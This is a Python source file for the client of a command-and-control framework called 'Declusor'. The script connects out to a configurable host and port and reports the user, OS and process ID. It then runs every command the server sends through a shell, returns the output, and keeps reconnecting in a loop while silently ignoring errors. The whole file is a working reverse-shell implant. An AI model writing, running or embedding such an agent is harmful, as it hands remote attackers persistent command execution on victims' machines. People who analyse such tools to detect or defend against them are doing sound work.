#!/usr/bin/env python3
# -----------------------------------------------------------------------------
# Declusor Python Client
# Implements the Declusor C2 Protocol (DCP).
# -----------------------------------------------------------------------------

import socket
import struct
import subprocess
import os
import sys
import platform
import time

# Configuration
HOST = os.environ.get("HOST", "127.0.0.1")
PORT = int(os.environ.get("PORT", 4444))

# DCP Message Types
MSG_AUTH_HELLO = 0x01
MSG_AUTH_ACK   = 0x02
MSG_CMD_EXEC   = 0x10
MSG_CMD_STDOUT = 0x11
MSG_CMD_STDERR = 0x12
MSG_CMD_EXIT   = 0x13
MSG_HEARTBEAT  = 0x20
MSG_TERM       = 0x99

def send_frame(sock, msg_type, payload=b''):
    """Sends a DCP frame: [Length (4B)][Type (1B)][Payload]"""
    if isinstance(payload, str):
        payload = payload.encode()
    length = len(payload)
    # Pack Length (4 bytes Big Endian) and Type (1 byte)
    header = struct.pack('>IB', length, msg_type)
    sock.sendall(header + payload)

def recv_frame(sock):
    """Receives a DCP frame, returning (msg_type, payload)"""
    # Read Header (5 bytes)
    header = b''
    while len(header) < 5:
        chunk = sock.recv(5 - len(header))
        if not chunk: return None, None
        header += chunk
    
    length, msg_type = struct.unpack('>IB', header)
    
    # Read Payload
    payload = b''
    while len(payload) < length:
        chunk = sock.recv(length - len(payload))
        if not chunk: return None, None
        payload += chunk
        
    return msg_type, payload

def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            
            # Handshake
            user = os.environ.get("USER", "unknown")
            meta = f"user={user}&os={platform.system()}&arch={platform.machine()}&pid={os.getpid()}"
            send_frame(s, MSG_AUTH_HELLO, meta)
            
            # Wait for ACK
            mtype, _ = recv_frame(s)
            if mtype != MSG_AUTH_ACK:
                s.close()
                time.sleep(5)
                continue
                
            while True:
                mtype, payload = recv_frame(s)
                if mtype is None: break
                
                if mtype == MSG_CMD_EXEC:
                    cmd = payload.decode(errors='ignore')
                    try:
                        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout, stderr = proc.communicate()
                        
                        if stdout:
                            send_frame(s, MSG_CMD_STDOUT, stdout)
                        if stderr:
                            send_frame(s, MSG_CMD_STDERR, stderr)
                        
                        send_frame(s, MSG_CMD_EXIT, str(proc.returncode))
                    except Exception as e:
                        send_frame(s, MSG_CMD_STDERR, str(e))
                        send_frame(s, MSG_CMD_EXIT, "-1")
                    
                elif mtype == MSG_HEARTBEAT:
                    send_frame(s, MSG_HEARTBEAT)
                elif mtype == MSG_TERM:
                    break
            
            s.close()
        except Exception:
            pass
        
        time.sleep(5)

if __name__ == "__main__":
    main()
